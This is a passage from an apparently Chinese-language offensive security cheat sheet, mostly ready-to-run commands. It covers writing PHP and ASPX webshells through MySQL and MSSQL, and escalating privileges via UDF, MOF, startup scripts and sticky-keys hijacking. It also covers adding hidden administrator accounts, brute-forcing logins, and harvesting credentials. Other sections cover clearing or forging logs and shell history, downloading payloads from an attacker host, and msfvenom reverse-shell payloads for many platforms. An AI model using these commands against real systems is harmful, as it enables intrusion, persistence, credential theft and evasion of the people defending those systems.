select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
 
```

注意：outfile函数可以导出多行，而dumpfile只能导出一行数据outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式

借助表导出。

```
Drop TABLE IF EXISTS temp;
Create TABLE temp(cmd text NOT NULL);
Insert INTO temp (cmd) VALUES('<?php eval($_POST[xxx]) ?>');
Select cmd from temp into out file '/var/www/xx.php';
Drop TABLE IF EXISTS temp;  
 
```

也可以用mysql 的 -e 参数

```
mysql -u user -p passwd -e "select '' into outfile '/var/www/xxx.php'"
```

##### 2、利用general_log拿shell

如果导入导出被禁用了就可以用这个方法试试。

原理：利用修改日志文件路径，往日志文件写入一句话。

条件：

1.对应web目录有写权限

2.需要有物理路径

3.如果拿到的是注入，还需要能执行堆叠注入

4.root用户，或者有对应权限的用户

利用如下:开启日志，更改路径，把一句话写入日志文件。

```
set global general_log=on;  
set global general_log_file='/var/www/1.php';  
select '<?php eval($_POST[safe6]) ?>';
```

#### 三、任意文件读取

既然有文件导出，肯定也有文件导入。关于任意文件读取怎么用，我之前总结过。

条件：和导出shell的条件一样。

利用:先创建一张表，读取文件内容到表。

```
create table a (v text);
load data infile 'file_name' into table table_name fields terminated by '分隔符'  
 
```

例如读text.txt：

```
load data infile 'C:/phpstudy/MySQL/test.txt' into table a fields terminated by ',';
```

查看内容

```
SELECT * FROM a
```

#### 四、mysql提权

先推荐一个小工具https://github.com/T3st0r-Git/HackMySQL

**1、mof提权**

原理：

利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。

条件：

1、mof提权的前提是root用户

2、可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下

利用：

网上工具也很多，可以直接用msf的exploit/windows/mysql/mysql_mof模块，执行成功后会直接反弹meterpreter。

**2、udf提权**

原理：

UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。

条件：

1、系统是Windows(Win2000,XP,Win2003)；有一个mysql数据库的账户拥有insert和delete权限，以创建和抛弃函数。

2、Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。

3、Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\

system32。

4、拥有相应目录的写权限

注意：一般Lib、Plugin文件夹需要手工建立（也可用NTFS ADS流模式突破进而创建文件夹）

```
select @@basedir; //查找到mysql的目录
select 'It is dll' into dumpfile 'C:\\\ProgramFiles\\\MySQL\\\MySQL Server 5.1\\\lib::$INDEX\_ALLOCATION'; //利用NTFS ADS创建lib目录
select 'It is dll' into dumpfile 'C:\\\ProgramFiles\\\MySQL\\\MySQL Server 5.1\\\lib\\\plugin::$INDEX\_ALLOCATION'; //利用NTFS ADS创建plugin目录
```

利用：

直接用msf的use exploit/multi/mysql/mysql_udf_payload模块.

msf会将dll文件写入lib\plugin\目录下(前提是该目录存在，如果该目录不存在的话，则无法执行成功)，dll文件名为**随机生成**的名字(记下来后面手动创建需要用到)。该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。

手动创建sys_eval()

```
create function sys_eval returns string soname 'SGJECYG.dll';
```

执行手动创建的函数

```
select sys_eval('whoami');
```

检查有没有创建成功

```
select * from mysql.func where name = 'sys_eval';
```

删除函数

```
drop function sys_eval;
```

**3、启动项提权**

原理：本质还是用导出命令来实现，导出脚本到启动目录，服务器重启就执行脚本。

条件：上面说过了。

利用：

写个vbs到启动目录,想办法让服务器重启。

```
1，开始菜单当前用户启动文件夹--C:\\Users\\用户名\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
2，开始菜单所有用户启动文件夹--C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp
3，注册表当前用户开机启动项目录--HKEY\_CURRENT\_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
4，注册表所有用户开机启动项目录--HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

写脚本

```
create table a (cmd text);//创建表
insert into a values ("set wshshell=createobject(""wscript.shell"") " );//写数据到表
insert into a values ("a=wshshell.run(""cmd.exe /c net user aabbcc 123456 /add"",0) " );
insert into a values ("b=wshshell.run(""cmd.exe /c net localgroup administrators aabbcc/add"",0) " );
select * from a into outfile "C:\\\Documents andSettings\\\All Users\\\「开始」菜单\\\程序\\\启动\\\a.vbs";//导出vbs
```

msf下也有对应模块exploit/windows/mysql/mysql_start_up

#### 五、拓展

其他常用msf模块

exploit/windows/mysql/scrutinizer_upload_exec（上传文件执行）

auxiliary/scanner/mysql/mysql_hashdump（mysql的mysql.user表的hash）

auxiliary/admin/mysql/mysql_sql（执行sql语句，navicat更香）

auxiliary/scanner/mysql/mysql_version（识别版本）

#### 六、参考

https://xz.aliyun.com/t/3973

https://xz.aliyun.com/t/1491

https://blog.csdn.net/qq_37077262/article/details/102964050

http://www.safe6.cn/article/108

https://blog.csdn.net/qq_36119192/article/details/84863268

https://www.freebuf.com/articles/system/163144.html



### mssql渗透总结

膜拜大佬文章https://y4er.com/post/mssql-getshel

#### getshell

能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。

拿shell的两大前提就是

1. 有相应的权限db_owner
2. 知道web目录的绝对路径

我们先来了解下怎么去寻找web目录的绝对路径。

##### 寻找绝对路径

1. 报错信息
2. 字典猜
3. 旁站的目录
4. 存储过程来搜索
5. 读配置文件

前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。

在mssql中有两个存储过程可以帮我们来找绝对路径：`xp_cmdshell xp_dirtree`

先来看`xp_dirtree`直接举例子

```mssql
execute master..xp_dirtree 'c:' --列出所有c:\文件、目录、子目录 
execute master..xp_dirtree 'c:',1 --只列c:\目录
execute master..xp_dirtree 'c:',1,1 --列c:\目录、文件
```

当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中

```mssql
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

我们再来看`xp_cmdshell`怎么去找绝对路径，实际上原理就是调用cmd来查找文件，相对来说这种方法更方便。

当然你可能遇到xp_cmdshell不能调用 如果报错

> SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用。

可以用如下命令恢复

```
;EXEC sp_configure 'show advanced options',1;//允许修改高级参数
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;  //打开xp_cmdshell扩展
RECONFIGURE;--
```



当然还不行可能xplog70.dll需要恢复，看具体情况来解决吧

接下来我们先来看cmd中怎么查找文件。

| `1 2 3 ` | `C:\Users\Y4er>for /r e:\ %i in (1*.php) do @echo %i e:\code\php\1.php C:\Users\Y4er> ` |
| -------- | ------------------------------------------------------------ |
|          |                                                              |

那么我们只需要建立一个表 存在一个char字段就可以了

```mssql
http://192.168.130.137/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));

http://192.168.130.137/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
```

然后通过注入去查询该表就可以了。

------

此时我们拿到绝对路径之后，我们接着往下看怎么拿shell

##### xp_cmdshell拿shell

xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径

```mssql
http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\404.aspx' ;
```

由于cmd写webshell的主意这些转义的问题 推荐使用certutil或者vbs什么的来下载

##### 差异备份拿shell

```mssql
1. backup database 库名 to disk = 'c:\bak.bak';--

2. create table [dbo].[test] ([cmd] [image]);

3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)

4. backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;--
```

因为权限的问题，最好不要备份到盘符根目录

当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。

##### log备份拿shell

LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式

```mssql
1. alter database 库名 set RECOVERY FULL 

2. create table cmd (a image) 

3. backup log 库名 to disk = 'c:\xxx' with init 

4. insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 

5. backup log 库名 to disk = 'c:\xxx\2.asp'
```

log备份的好处就是备份出来的webshell的文件大小非常的小

#### getsystem

我们继续来探究怎么进行提权

##### xp_cmdshell

在2005中xp_cmdshell的权限是system，2008中是network。

当遇到无法写shell，或者是站库分离的时候，直接通过xp_cmdshell来下载我们的payload来上线会更加方便。下载文件通常有下面几种姿势

1. certutil
2. vbs
3. bitsadmin
4. powershell
5. ftp

这个我会放在下一篇文章中细讲。

通过下载文件之后用xp_cmdshell来执行我们的payload，通过Cobalt Strike来进行下一步操作，比如怼exp或许会更加方便。

##### sp_oacreate

当xp_cmdshell 被删除可以使用这个来提权试试,恢复sp_oacreate

```
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'Ole Automation Procedures', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'show advanced options', 0;
```



sp_oacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合sp_oamethod 来写文件执行cmd

在以前的系统有这几种用法

1. 调用cmd 来执行命令

```
wscript.shell执行命令

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c xxx'



Shell.Application执行命令
declare @o int
exec sp_oacreate 'Shell.Application', @o out
exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:\test.txt','c:\windows\system32','','1';
```



1. 写入启动项

```
declare @sp_passwordxieo int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\RECYCLER\1.vbs', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","123$")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "123"'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/123$",user)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/123$"';
```



1. 粘贴键替换

```
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
```



大家可以灵活运用，这里也可以这样玩，把他写成vbs或者其他的来下载文件 ，为什么不直接调用cmd来下载，再2008系统上我是不成功的，但是sp_oacreate可以启动这个文件，所以换个思路

```
declare @sp_passwordxieo int, @f int, @t int, @ret int;
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out;
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'c:\www\1.bat', 1;
exec @ret = sp_oamethod @f, 'writeline', NULL,'@echo off';
exec @ret = sp_oamethod @f, 'writeline', NULL,'start cmd /k "cd c:\www & certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe"';


declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\www\1.bat'

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\www\file.exe'
```



当然这里只是一种思路，你完全可以用vbs来下载什么的

##### 沙盒提权

```mssql
1. exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

2. exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

3. Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Databasec:\windows\system32\ias\ias.mdb','select shell( net user itpro gmasfm /add )');
```

引用前辈们的话

> 1，Access可以调用VBS的函数，以System权限执行任意命令
> 2，Access执行这个命令是有条件的，需要一个开关被打开
> 3，这个开关在注册表里
> 4，SA是有权限写注册表的
> 5，用SA写注册表的权限打开那个开关
> 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令

##### xp_regwrite

修改注册表 来劫持粘贴键 当然在2008数据库是不成立的 因为默认权限很低

```
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution
Options\sethc.EXE','Debugger','REG_SZ','C:\WINDOWS\explorer.exe';
```



mssql众多的储存过程是我们利用的关键，还有很多可能没被提出，需要自己的发现，比如在遇到iis6的拿不了shell还有个上传可以跳目录，不妨试试xp_create_subdir建立个畸形目录解析。







## **工具使用**



### 爆破攻击

#### Hydra

```
参数：
-l 指定的用户名 -L 用户名字典
-p 指定密码 -P 密码字典
-s 指定端口 
-o 输出文件
-t 任务数默认16
-f 爆破成功一个就停止
-v 报错日志详细 -V 攻击日志
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
>hydra -L /root/user.txt -P pass.txt smb 10.1.1.10 -vV
>hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
```

#### Medusa

```
参数：
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
>medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
>medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
```

# 权限维持

持久化和提权相关



## 提权检测脚本

unix-privesc-check：http://pentestmonkey.net/tools/audit/unix-privesc-check

linuxprivchecker： https://www.securitysift.com/download/linuxprivchecker.py

linEnum: http://qiniu.safe6.cn/LinEnum.sh

linux-exploit-suggester: https://github.com/HappyTreeFriend/linux-exploit-suggester

Windows提权辅助脚本： https://github.com/pentestmonkey/windows-privesc-check





## 安卓锁屏破解

安卓破解锁屏可以 拿key破解,或者删除key文件(/data/system/password.key)



## 交互shell获取

很多时候我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端

```text
python3 -c "import pty;pty.spawn('/bin/bash')"
python2 -c 'import pty;pty.spawn("/bin/sh")'
```







## 无交互账号添加

**chpasswd 方法**

```bash
useradd newuser;echo "newuser:password"|chpasswd
```

**useradd -p 方法**

```bash
useradd -p `openssl passwd 123456` guest

useradd -p "$(openssl passwd 123456)" guest
```

**echo -e 方法**

```text
useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
```



## Cobalt Strike笔记



### argue参数污染

条件：使用adminstrator或system权限

场景：机器上线后，无法执行命令被av拦截。

Use:

```
argue [command] [fake arguments]
```

注意：fake arguments应该比真实的要长

例子：

污染powershell，污染完后即可正常执行powershell

```
argue powershell.exe xsdffsdfwfws
```





# 痕迹清理

## windows清理

### 日志清除

**windows 日志路径：**

```
系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx
安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx
应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx
日志在注册表的键：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog
```

**windows 日志清除方式：**

**（1）最简单粗暴的方式**

开始→运行,输入 `eventvwr` 进入事件查看器，右边栏选择清除日志。

**（2）命令行一键清除Windows事件日志**

```
PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}"
Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}
```

**（3）利用脚本停止日志的记录**

通过该脚本遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以杀死事件日志服务线程。

因此，系统将无法收集日志，同时事件日志服务似乎正在运行。

```
github项目地址：https://github.com/hlldz/Invoke-Phant0m
```

**（4）Windows单条日志清除**

该工具主要用于从Windows事件日志中删除指定的记录。

```
github项目地址：https://github.com/QAX-A-Team/EventCleaner
```

**（5）Windows日志伪造**

使用eventcreate这个命令行工具来伪造日志或者使用自定义的大量垃圾信息覆盖现有日志。

```
eventcreate -l system -so administrator -t warning -d "this is a test" -id 500
```

**IIS日志**

IIS默认日志路径：

```
%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\
```

清除WWW日志：

```cmd
停止服务：net stop w3svc
删除日志目录下所有文件：del *.*
启用服务：net start w3svc
```

### 永久擦除技巧

***利用Windows自带命令进行安全擦除***

**（1）Shift+Delete快捷键永久删除**

直接删除文件，还是能在回收站找到的，使用Shift+Delete快捷键可以直接永久删除了。但是用数据恢复软件，删除的文件尽快恢复，否则新的文件存入覆盖了原来的文件痕迹就很难恢复了。

**（2）Cipher 命令多次覆写**

在删除文件后，可以利用Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间，彻底删除数据防止被恢复。

比如，删除`D:\tools`目录下的文件，然后执行这条命令：

```
cipher /w:D:\tools
```

这样一来，D 盘上未使用空间就会被覆盖三次：一次 0x00、一次 0xFF，一次随机数，所有被删除的文件就都不可能被恢复了。

**（3）Format命令覆盖格式化**

Format 命令加上 /P 参数后，就会把每个扇区先清零，再用随机数覆盖。而且可以覆盖多次。比如：

```
format D: /P:8
```

这条命令表示把 D 盘用随机数覆盖 8 次。

### 清除远程桌面连接记录

当通过本机远程连接其他客户端或服务器后，会在本机存留远程桌面连接记录。代码保存为`clear.bat`文件，双击运行即可自动化清除远程桌面连接记录。

```cmd
@echo off
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\attrib Default.rdp -s -h
del Default.rdp
```

### 利用Metasploit 痕迹清除

（1）查看事件日志

```bash
meterpreter > run event_manager  -i   
[*] Retriving Event Log Configuration

Event Logs on System
====================

 Name                    Retention  Maximum Size  Records 
 ----                    ---------  ------------  ------- 
 Application             Disabled   20971520K     2149 
 HardwareEvents          Disabled   20971520K     0 
 Internet Explorer       Disabled   K             0 
 Key Management Service  Disabled   20971520K     0 
 Security                Disabled   20971520K     1726 
 System                  Disabled   20971520K     3555 
 Windows PowerShell      Disabled   15728640K     138
```
（2）清除事件日志（包括六种日志类型）

```bash
meterpreter > run event_manager  -c
```

（3）另外，也可以输入clearv命令清除目标系统的事件日志（仅包含三种日志类型）

```bash
meterpreter > clearev 
[*] Wiping 4 records from Application...
[*] Wiping 8 records from System...
[*] Wiping 7 records from Security...
```

## linux清理

### 日志清除

```cmd
/var/log/btmp   记录所有登录失败信息，使用lastb命令查看
/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
/var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
/var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
/var/log/secure   记录与安全相关的日志信息
/var/log/message  记录系统启动后的信息和错误日志
```

**第一种方式：清空日志文件**

清除登录系统失败的记录：

```bash
[root@centos]# echo > /var/log/btmp 
[root@centos]# lastb             //查询不到登录失败信息
```

清除登录系统成功的记录：

```bash
[root@centos]# echo > /var/log/wtmp  
[root@centos]# last              //查询不到登录成功的信息
```

清除相关日志信息：

```cmd
清除用户最后一次登录时间：echo > /var/log/lastlog          #lastlog命令
清除当前登录用户的信息：echo >   /var/log/utmp             #使用w,who,users等命令
清除安全日志记录：cat /dev/null >  /var/log/secure
清除系统日志记录：cat /dev/null >  /var/log/message
```

**第二种方式：删除/替换部分日志**

日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。

```bash
# 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip
sed  -i '/自己的ip/'d  /var/log/messages

# 全局替换登录IP地址：
sed -i 's/192.168.166.85/192.168.1.1/g' secure
```

**第三种方式：web日志**

**直接替换日志ip地址**

```bash
sed -i 's/192.168.166.85/192.168.1.1/g' access.log
```

**清除部分相关日志**

```bash
# 使用grep -v来把我们的相关信息删除
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log
# 把修改过的日志覆盖到原日志文件
cat tmp.log > /var/log/nginx/access.log
```

### 永久擦除技巧

**（1）shred命令**

实现安全的从硬盘上擦除数据，默认覆盖3次，通过 -n指定数据覆盖次数。

```bash
[root@centos]# shred -f -u -z -v -n 8 1.txt 
shred: 1.txt: pass 1/9 (random)...
shred: 1.txt: pass 2/9 (ffffff)...
shred: 1.txt: pass 3/9 (aaaaaa)...
shred: 1.txt: pass 4/9 (random)...
shred: 1.txt: pass 5/9 (000000)...
shred: 1.txt: pass 6/9 (random)...
shred: 1.txt: pass 7/9 (555555)...
shred: 1.txt: pass 8/9 (random)...
shred: 1.txt: pass 9/9 (000000)...
shred: 1.txt: removing
shred: 1.txt: renamed to 00000
shred: 00000: renamed to 0000
shred: 0000: renamed to 000
shred: 000: renamed to 00
shred: 00: renamed to 0
shred: 1.txt: removed
```

**（2）dd命令**

可用于安全地清除硬盘或者分区的内容。

```bash
dd if=/dev/zero of=要删除的文件 bs=大小 count=写入的次数
```

**（3）wipe**

Wipe 使用特殊的模式来重复地写文件，从磁性介质中安全擦除文件。

```bash
wipe filename
```

**（4）Secure-Delete**

Secure-Delete 是一组工具集合，提供srm、smem、sfill、sswap，4个安全删除文件的命令行工具。

```bash
srm filenames
fill filename
sswap /dev/sda1
smem
```

### 清除history记录

**第一种方式：**

（1）编辑history记录文件，删除部分不想被保存的历史命令。

```bash
vim ~/.bash_history
```

（2）清除当前用户的history命令记录

```bash
history -c
```

**第二种方式：**

（1）利用vim特性删除历史命令

```bash
#使用vim打开一个文件
vi test.txt

# 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。
:set history=0

# 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令
vsp ~/.bash_history

# 清除保存.bash_history文件即可。
```

（2）在vim中执行自己不想让别人看到的命令

```bash
:set history=0
:!command
```

**第三种方式：**

通过修改配置文件/etc/profile，使系统不再保存命令记录。

```bash
HISTSIZE=0
```

**第四种方式：**

登录后执行下面命令,不记录历史命令(.bash_history)

```bash
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
```

### 隐藏远程SSH登陆记录

隐身登录系统，不会被w、who、last等指令检测到。

```bash
ssh -T root@192.168.0.1 /bin/bash -i
```

不记录ssh公钥在本地.ssh目录中

```bash
ssh -o UserKnownHostsFile=/dev/null -T user@192.168.0.1 /bin/bash –i
```






# 横向移动

- linux反弹shell后保持会话不断,可以借⽤screen保持会话

- 把反弹shell转为交互式的shell

  ```python
python -c 'import pty; pty.spawn("/bin/bash")' //⽣成py半交互式shell ctrl+Z
  stty raw -echo fg
resetexport SHELL=bashexport TERM=xterm256-color stty rows 38 columns 116
  ```

- linux密码快速查找

  ```bash
  find / -name *.properties 2>/dev/null | grep WEB-INF
  
  find / -name "*.properties" | xargs egrep -i "user|pass|pwd|uname|login|db_" find / -regex ".*\.properties\|.*\.conf\|.*\.config" | xargs grep -E "=jdbc:|pass="
  
  find /webapp -regex ".*\.properties" -print 2>/dev/null | xargs grep -E "=jdbc:|rsync"
  
  find / -regex ".*\.properties" -print  2>/dev/null
  
  find / -regex ".*\.properties\|.*\.conf\|.*\.config\|.*\.sh" | xargs grep -E "=jdbc:|pass=|passwd="
  
  find / -regex ".*\.xml\|.*\.properties\|.*\.conf\|.*\.config\|.*\.jsp" | xargs grep -E "setCipherKey"
  ```

  ​	

## 内网常用命令

- whoami # 查看当前用户
- net user # 查看所有用户
- query user # 查看当前在线用户
- ipconfig /all # 查看当前主机的主机名/IP/DNS等信息
- route print # 查看路由表信息
- netstat -ano # 查看端口开放情况
- arp -a # 查看arp解析情况
- tasklist /svc # 查看进程及对应服务名
- net localgroup administrators # 查看管理员组成员
- systeminfo # 查看系统信息含补丁信息
- net use # 查看ipc连接情况
- net view # 查看匿名共享情况
- netsh firewall show state # 查看防火墙状态
- cmdkey /l # 查看当前保存的登陆凭证

## 密码搜集

- netsh wlan show profiles # 查看连接过的wifi名称
- netsh wlan show profile name="wifi名称" key=clear # 查看wifi的密码
- dir /a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证
- dir /a /s /b "网站目录\*config*" > 1.txt # 数据库配置文件
- laZagne.exe all -oN # 本地wifi/浏览器等密码
- dir %APPDATA%\Microsoft\Windows\Recent # 查看最近打开的文档

## 连通性

- ping [www.baidu.com](http://www.baidu.com/) # ICMP连通性
- nslookup [www.baidu.com](http://www.baidu.com/) # DNS连通性
- curl [https://www.baidu.com](https://www.baidu.com/) # http连通性
- nc ip port # TCP连通性

# 域信息收集

## 常用信息收集

- net config workstation #查看当前登录域
- net user /domain # 获得所有域用户列表
- net view /domain # 查看所有的域
- net view /domain:XXX # 查看该域内所有主机
- net group /domain # 查看所有域用户组列表
- net group "domain computers" /domain # 查看域内所有的主机名
- net group "domain admins" /domain # 查看所有域管理员
- net group "domain controllers" /domain # 查看所有域控制器
- net group "enterprise admins" /domain # 查看所有企业管理员
- nltest /domain_trusts # 获取域信任信息
- net time /domain # 查看当前登录域
- net accounts /domain # 查看域密码策略
- dsquery server # 寻找目录中的域控制器
- netdom query pdc # 查看域控制器主机名
- wmic useraccount get /all #获取域内用户的详细信息

## 环境信息搜集

- nbtscan.exe xx.xx.xx.xx/24 # 查看c段机器
- csvde.exe -f 1.csv -k # 批量导入/导出AD用户
- setspn.exe -T xx.xx.xx.xx -Q */* # 查看当前域内所有spn

## 密码搜集

- dir /s /a \域控IP\SYSVOL*.xml # 获取域里面所有机子的本地管理员账号密码



# 内网渗透合集

手把手教你入门内网渗透之一

1. 信息搜集+内网提权+隧道搭建

https://www.anquanke.com/post/id/221264

手把手教你入门内网渗透之二

1. 内网横向移动

https://www.anquanke.com/post/id/222269

手把手教你入门内网渗透之三

1. 持久化控制：后门+免杀

https://www.anquanke.com/post/id/223095



# payload生成

windows:
```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=
攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o
payload.exe
```

mac:
```bash msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP
LPORT=攻击机端口 -f macho -o payload.macho
```

android:

```bash
//需要签名
msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻
击机IP LPORT=攻击机端口 -f apk -o payload.apk
```

powershell:
```bash 
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=
攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
```

linux:
```bash 
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻
击机IP LPORT=攻击机端口 -f elf -o payload.elf
```

php:

```bash 
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=
<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >>
shell.php
```

aspx:

```bash 
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=
攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx
```

jsp:

```bash 
msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻
击机端口 -f raw -o payload.jsp ```
```

war:
```bash 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -
o payload.war
```
nodejs:
```bash 
msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
payload.js
```
python:
```bash 
msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -
f raw -o payload.py
```
perl:
```bash 
msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
payload.pl
```
ruby:
```bash 
msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
payload.rb
```
